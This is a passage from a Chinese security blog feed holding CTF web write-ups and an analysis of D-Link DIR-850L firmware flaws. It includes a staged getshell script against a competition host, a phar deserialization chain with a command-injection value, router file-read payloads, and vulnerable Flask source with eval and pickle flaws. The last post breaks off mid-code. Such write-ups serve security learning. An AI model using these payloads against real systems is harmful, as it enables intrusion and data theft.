class="string">'&gt;a.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\&gt;\\'</span>,</span><br><span class="line">    <span class="string">'&gt;E1\\'</span>,</span><br><span class="line">    <span class="string">'&gt;01\\'</span>,</span><br><span class="line">    <span class="string">'&gt;E8\\'</span>,</span><br><span class="line">    <span class="string">'&gt;31\\'</span>,</span><br><span class="line">    <span class="string">'&gt;0x\\'</span>,#IP地址的<span class="number">16</span>进制</span><br><span class="line">    <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">    <span class="string">'&gt;rl\\'</span>,</span><br><span class="line">    <span class="string">'&gt;cu\\'</span>,# getshell</span><br><span class="line">    <span class="string">'sh x'</span>,</span><br><span class="line">    <span class="string">'sh g'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload_all = <span class="string">'compress.zlib://data:@127.0.0.1/plain;base64,&#123;0&#125;'</span></span><br><span class="line">cookies=&#123;<span class="string">'PHPSESSID'</span>: <span class="string">'d1b8d083fa8c9bdb28317c30b103bbb6'</span>&#125;</span><br><span class="line">r = requests.get(<span class="string">'http://121.36.222.22:88/core/clear.php'</span>,cookies=cookies)</span><br><span class="line">for i <span class="keyword">in</span> payload:</span><br><span class="line">    assert len(i) &lt;= <span class="number">20</span></span><br><span class="line">    r = requests.post(<span class="string">'http://121.36.222.22:88/core/index.php'</span>,cookies=cookies,data=&#123;<span class="string">"url"</span>:payload_all.format(base64.b64encode(i))&#125;)</span><br><span class="line">    print r.text</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309141741059.png" alt></p>
<h3 id="0x07-webct"><a href="#0x07-webct" class="headerlink" title="0x07 webct"></a>0x07 webct</h3><p>访问<a href="http://www.zip拿到题目源码，题目提供了两个页面，一个是测试数据库连接，一个是文件上传，分析一下源码" target="_blank" rel="noopener">www.zip拿到题目源码，题目提供了两个页面，一个是测试数据库连接，一个是文件上传，分析一下源码</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#testsql.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">$ip = $_POST[<span class="string">'ip'</span>];</span><br><span class="line">$user = $_POST[<span class="string">'user'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$option = $_POST[<span class="string">'option'</span>];</span><br><span class="line">$m = <span class="keyword">new</span> db($ip,$user,$password,$option);</span><br><span class="line">$m-&gt;testquery();</span><br></pre></td></tr></table></figure>

<p>数据库连接测试接收到数据后实例化db类进行测试连接，文件上传页面源码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span></span><br><span class="line"><span class="php"><span class="comment">//var_dump($_FILES["file"]);</span></span></span><br><span class="line"><span class="php">$file = <span class="keyword">new</span> File($_FILES[<span class="string">"file"</span>]);</span></span><br><span class="line"><span class="php">$fileupload = <span class="keyword">new</span> Fileupload($file);</span></span><br><span class="line"><span class="php">$fileupload-&gt;deal();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"存储的图片:"</span>.<span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">$ls = <span class="keyword">new</span> Listfile(<span class="string">'./uploads/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $ls-&gt;listdir().<span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>各个类的实现代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> $user;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $option;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ip,$user,$password,$option)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user=$user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip=$ip;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;option=$option;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">testquery</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $m = <span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;ip,<span class="keyword">$this</span>-&gt;user,<span class="keyword">$this</span>-&gt;password);</span><br><span class="line">        <span class="keyword">if</span>($m-&gt;connect_error)&#123;</span><br><span class="line">            <span class="keyword">die</span>($m-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $m-&gt;options(<span class="keyword">$this</span>-&gt;option,<span class="number">1</span>);</span><br><span class="line">        $result=$m-&gt;query(<span class="string">'select 1;'</span>);</span><br><span class="line">        <span class="keyword">if</span>($result-&gt;num_rows&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'测试完毕，数据库服务器处于开启状态'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'测试完毕,数据库服务器未开启'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uploadfile;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uploadfile=$filename;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">xs</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'请求结束'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fileupload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deal</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $extensionarr=<span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"jpeg"</span>,<span class="string">"jpg"</span>,<span class="string">"png"</span>);</span><br><span class="line">        $extension = pathinfo(<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">'name'</span>], PATHINFO_EXTENSION);</span><br><span class="line">        $type = <span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">'type'</span>];</span><br><span class="line">        <span class="comment">//echo "type: ".$type;</span></span><br><span class="line">        $filetypearr=<span class="keyword">array</span>(<span class="string">"image/jpeg"</span>,<span class="string">"image/png"</span>,<span class="string">"image/gif"</span>);</span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$extensionarr)&amp;in_array($type,$filetypearr)&amp;<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">"size"</span>]&lt;<span class="number">204800</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"错误：: "</span> .<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(!is_dir(<span class="string">"./uploads/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"/"</span>))&#123;</span><br><span class="line">                    mkdir(<span class="string">"./uploads/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"/"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $upload_dir=<span class="string">"./uploads/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"/"</span>;</span><br><span class="line">                move_uploaded_file(<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">"tmp_name"</span>],$upload_dir.md5(<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">'name'</span>]).<span class="string">"."</span>.$extension);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"上传成功"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"不被允许的文件类型"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file-&gt;xs();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">listdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file);  <span class="comment">#👈这个地方明显的反序列化，所以主要就是构造的问题</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以整体逻辑也很清晰，利用文件上传上传phar文件，通过<a href="https://github.com/Gifts/Rogue-MySql-Server" target="_blank" rel="noopener">Rogue-MySql-Server</a>访问phar文件触发反序列化</p>
<p>首先构造一下phar</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Fileupload</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file = $file;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file-&gt;xs();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file=<span class="string">"/ ;/readflag"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">@unlink(<span class="string">"ccc.phar"</span>);</span></span><br><span class="line"><span class="php">$phar = <span class="keyword">new</span> Phar(<span class="string">"ccc.phar"</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span></span><br><span class="line"><span class="php">$a=<span class="keyword">new</span> Listfile();</span></span><br><span class="line"><span class="php">$b=<span class="keyword">new</span> Fileupload($a);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($b);</span></span><br><span class="line"><span class="php">$phar-&gt;setMetadata($b);</span></span><br><span class="line"><span class="php">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span></span><br><span class="line"><span class="php">$phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>输出ccc.phar后进行上传</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309180801242.png" alt></p>
<p>在vps上编辑Rogue-MySql-Server脚本启动就行</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309180850045.png" alt></p>
<p>还有一个问题就是testsql中的option设成什么？option用于设置MYSQLI_OPT_LOCAL_INFILE，本地查看一下</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309181317575.png" alt></p>
<p>所以option设置为8就行了，利用testsql访问服务器上起的rogue_mysql_server服务就会直接触发/readflag</p>
<p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309181536562.png" alt></p>
<h3 id="0x08-nothardweb"><a href="#0x08-nothardweb" class="headerlink" title="0x08 nothardweb"></a>0x08 nothardweb</h3><p>这个没去看，具体思路是跑seed（这里有一个非预期），可以直接构造cookie，打内网，之后内网还有一个tomcat，复现后写</p>
<h3 id="0x09-easy-trick-gzmtu"><a href="#0x09-easy-trick-gzmtu" class="headerlink" title="0x09 easy_trick_gzmtu"></a>0x09 easy_trick_gzmtu</h3><p>SQL注入后，复现写</p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>小白的跨方向IoT DIR850L-A1固件漏洞分析</title>
    <url>/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h1><p>我是到官网的查询下载的，下载地址：<a href="http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-850L" target="_blank" rel="noopener">http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-850L</a><br>也可以直接到ftp服务器上下载：<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-850L/REVA/DIR-850L_REVA_FIRMWARE_1.14.B07_WW.ZIP" target="_blank" rel="noopener">ftp://ftp2.dlink.com/PRODUCTS/DIR-850L/REVA/DIR-850L_REVA_FIRMWARE_1.14.B07_WW.ZIP</a></p>
<h1 id="固件解压"><a href="#固件解压" class="headerlink" title="固件解压"></a>固件解压</h1><p>下载的bin文件利用binwalk进行解压</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">binwalk -Me <span class="module-access"><span class="module"><span class="identifier">DIR850L_FW113WWb01_f4if</span>.</span></span>bin</span><br></pre></td></tr></table></figure>
<p>起文件系统的路径为</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">/<span class="module-access"><span class="module"><span class="identifier">_DIR850L_FW113WWb01_f4if</span>.</span></span>bin.extracted/squashfs-root</span><br></pre></td></tr></table></figure>
<p>其中web服务放置于htdocs中，我是进行白盒跟着早前的分析文章进行分析，所以将文件夹打包到本地查看代码。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞分析得前提是要会用ida逆向cgi文件来分析web服务调用逻辑。</p>
<h3 id="0x01-getcfg-php-任意文件读取"><a href="#0x01-getcfg-php-任意文件读取" class="headerlink" title="0x01 getcfg.php 任意文件读取"></a>0x01 getcfg.php 任意文件读取</h3><p>查看\htdocs\web\getcfg.php的源代码👇</p>
<p><img src="/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-982fa7a4d7c2e2c5.png" alt></p>
<p>这个代码逻辑特别简单了，就是SERVICES参数的值传入变量$GETCFG_SVC中，最后拼接到了变量$file中，利用dophp函数给load出来了，也就是说我们可以控制SERVICES的值，即可以控制file指向的文件，虽然说后面拼接了’.xml.php’，不过虽然事小白的我也知道后缀为’.xml.php’有管理员信息的文件~，不过显然这是一个else条件触发的代码，所以看一下前面的if条件👇</p>
<p><img src="/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-cd9a505e1f416663.png" alt></p>
<p>这里需要判断一个AUTHORIZED_GROUP的值和CACHE，CACHE的简单，不输入或者不为True就好了，AUTHORIZED_GROUP这个就要涉及到分析cgi的事了，其中cgibin文件是负责解析php的，参考<a href="https://www.anquanke.com/post/id/175625来进行分析（毕竟一个IoT小白得先跟着一步一步来）👇" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175625来进行分析（毕竟一个IoT小白得先跟着一步一步来）👇</a></p>
<p><img src="/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-0fdf3218d2af148e.png" alt></p>
<p>通过sess_validate来解析验证AUTHORIZED_GROUP变量值，并通过sprintf处理作为全局变量，之后调用了sobj_add_string和sobj_add_char，由于在调用 sobj_add_char 函数时，会用换行符来分隔参数，也就是说构造 %0aAUTHORIZED_GROUP=1 即AUTHORIZED_GROUP会当作参数处理，处理后并作为全局变量，所以也就可以用来绕过is_power_user函数的身份检验，所以payload可以为👇</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">SERVICES</span>=DEVICE.ACCOUNT&amp;[随便啥都行]=%<span class="attribute">0aAUTHORIZED_GROUP</span>=1</span><br></pre></td></tr></table></figure>
<p>就可以触发相关逻辑代码，实现任意文件读取。</p>
<h3 id="0x02-fatlady-php-任意文件读取"><a href="#0x02-fatlady-php-任意文件读取" class="headerlink" title="0x02 fatlady.php 任意文件读取"></a>0x02 fatlady.php 任意文件读取</h3><p>由于用户向hedwig.cgi发送xml数据时，hedwig.xml会调用fatlady.php 文件进行处理，查看fatlady.php文件代码，路径\htdocs\webinc\fatlady.php👇</p>
<p><img src="/2020/03/04/%E5%B0%8F%E7%99%BD%E7%9A%84%E8%B7%A8%E6%96%B9%E5%90%91IoT-DIR850L-A1%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-219b62810a831de4.png" alt></p>
<p>同理，service直接拼接到了变量$target上，之后调用dophp进行load，导致直接读取任意以php为后缀的文件，同上，我们可以读取DEVICE.ACCOUNT.xml.php文件，即利用service进行跨目录读取，例如构造service的值为../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml，这里POST 数据包中 xml 数据带上 postxml标签即可，如👇</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="params">&lt;?xml version "<span class="number">1.0</span>" encoding "utf<span class="number">-8</span>"&gt;</span><span class="params">&lt;postxml&gt;</span><span class="params">&lt;module&gt;</span><span class="params">&lt;service&gt;</span>../../..<span class="meta-keyword">/htdocs/</span>webinc<span class="meta-keyword">/getcfg/</span>DEVICE.ACCOUNT.xml<span class="params">&lt;/service&gt;</span><span class="params">&lt;/module&gt;</span><span class="params">&lt;/postxml&gt;</span></span><br></pre></td></tr></table></figure>
<p>发送xml数据，将header中的Content-Type设置为text/xml即可。</p>
<p><strong>未完待续。。。。。。</strong></p>
]]></content>
      <categories>
        <category>Cyc1e的漏洞分析之路</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>IoT</tag>
      </tags>
  </entry>
  <entry>
    <title>OGeek决赛两道Web总结分析</title>
    <url>/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p><strong>很久没有打攻防赛了，致力于写出Perfect文件监控脚本我在这次比赛翻车了，服务器没有pytyon2环境，所以回来更新成了python3了，旅游队伍意外拿了个季军，总的来说赞一下这次比赛，体验还是不错的，小小总结一下决赛的Web（场上弟弟，赛后分析，不会java，漏洞也肯定没找全，欢迎师傅贴个文章学习一波）python和php题目源码下载地址：<a href="https://pan.baidu.com/s/1DdmgtN0cZpGsX_q1j-ooTQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1DdmgtN0cZpGsX_q1j-ooTQ</a> 提取码: 1jpa</strong></p>
<h2 id="0x01-mOtrix"><a href="#0x01-mOtrix" class="headerlink" title="0x01 mOtrix"></a>0x01 mOtrix</h2><p>一道python题，这里贴下源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template,send_from_directory, make_response</span><br><span class="line"><span class="keyword">from</span> Archives <span class="keyword">import</span> Archives</span><br><span class="line"><span class="keyword">import</span> pickle,base64,os</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">Jinja2 = Environment()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_str</span><span class="params">(type,str)</span>:</span></span><br><span class="line">    retstr = <span class="string">"%s'%s'"</span>%(type,str)</span><br><span class="line">    print(retstr)</span><br><span class="line">    <span class="keyword">return</span> eval(retstr)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    check_format = [<span class="string">'class'</span>,<span class="string">'+'</span>,<span class="string">'getitem'</span>,<span class="string">'request'</span>,<span class="string">'args'</span>,<span class="string">'subclasses'</span>,<span class="string">'builtins'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>]</span><br><span class="line">    <span class="keyword">return</span> choice(check_format)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> Archives</span><br><span class="line">    resp = make_response(render_template(<span class="string">'index.html'</span>, Archives = Archives))</span><br><span class="line">    cookies = bytes(get_cookie(), encoding = <span class="string">"utf-8"</span>)</span><br><span class="line">    value = base64.b64encode(cookies)</span><br><span class="line">    resp.set_cookie(<span class="string">"username"</span>, value=value)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/Archive/&lt;int:id&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Archive</span><span class="params">(id)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> Archives</span><br><span class="line">    <span class="keyword">if</span> id&gt;len(Archives):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>, msg=<span class="string">'文章ID不存在！'</span>, status=<span class="string">'失败'</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'Archive.html'</span>,Archive = Archives[id])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/message',methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        type = request.form[<span class="string">'type'</span>][:<span class="number">1</span>]</span><br><span class="line">        msg = request.form[<span class="string">'msg'</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = base64.b64decode(request.cookies.get(<span class="string">'user'</span>))</span><br><span class="line">            info = pickle.loads(info)</span><br><span class="line">            username = info[<span class="string">"name"</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            username = <span class="string">"Guest"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(msg)&gt;<span class="number">27</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>, msg=<span class="string">'留言太长了！'</span>, status=<span class="string">'留言失败'</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">'_'</span>, <span class="string">''</span>)</span><br><span class="line">        retstr = set_str(type,msg)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>,msg=retstr,status=<span class="string">'%s,留言成功'</span>%username)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/hello',methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    username = request.cookies.get(<span class="string">'username'</span>)</span><br><span class="line">    username = str(base64.b64decode(username), encoding = <span class="string">"utf-8"</span>)</span><br><span class="line">    data = Jinja2.from_string(<span class="string">"Hello , "</span> + username + <span class="string">'!'</span>).render()</span><br><span class="line">    is_value = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>, msg=data,is_value=is_value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/getvdot',methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getvdot</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'getvdot.html'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        matrix1 = base64.b64decode(request.form[<span class="string">'matrix1'</span>])</span><br><span class="line">        matrix2 = base64.b64decode(request.form[<span class="string">'matrix2'</span>])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            matrix1 = numpy.loads(matrix1)</span><br><span class="line">            matrix2 = numpy.loads(matrix2)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        result = numpy.vdot(matrix1,matrix2)</span><br><span class="line">        print(result)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'getvdot.html'</span>,msg=result,status=<span class="string">'向量点积'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/robots.txt',methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">texts</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">'/'</span>, <span class="string">'flag'</span>, 